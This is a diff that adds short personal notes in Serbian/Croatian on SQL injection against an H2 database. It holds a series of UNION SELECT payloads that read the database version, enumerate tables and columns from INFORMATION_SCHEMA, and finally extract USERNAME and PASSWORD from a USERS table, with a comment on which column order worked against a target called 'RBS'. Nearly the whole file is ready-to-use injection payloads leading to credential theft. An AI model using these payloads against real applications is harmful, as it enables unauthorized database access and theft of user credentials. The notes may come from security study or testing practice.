@@ -1,0 +1,35 @@
+###############################################################################
+#################################   H2 Baza   #################################
+###############################################################################
+
+// Ovo NIJE radilo na RBS
+.. UNION SELECT H2VERSION(), 2, 3, 4, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --
+
+// Ovo JESTE radilo
+.. UNION SELECT 1, 2, 3, H2VERSION(), TABLE_NAME FROM INFORMATION_SCHEMA.TABLES -- 
+
+// Razlog je u TIPU parametra. Mozda je 1 bio int, a 4 je STRING i zbog toga je
+// nemoguce napisati "1.4.200" unutar INT-a, i to vraca gresku
+
+H2VERSION() vraca verziju baze.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~ Dobija SVE tabele u nasoj Bazi, ukljucujuci i default meta-TABELE ~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+.. UNION SELECT 1, 2, 3, 4, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~ Dobijamo sve nazive KOLONA unutar TABELE "USERS" ~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+.. UNION SELECT 1, 2, 3, 4, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'USERS' --
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~ nakon ove iznad komande, mozemo da kazemo ~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+... UNION SELECT 1, 2, 3, USERNAME, PASSWORD FROM USERS --
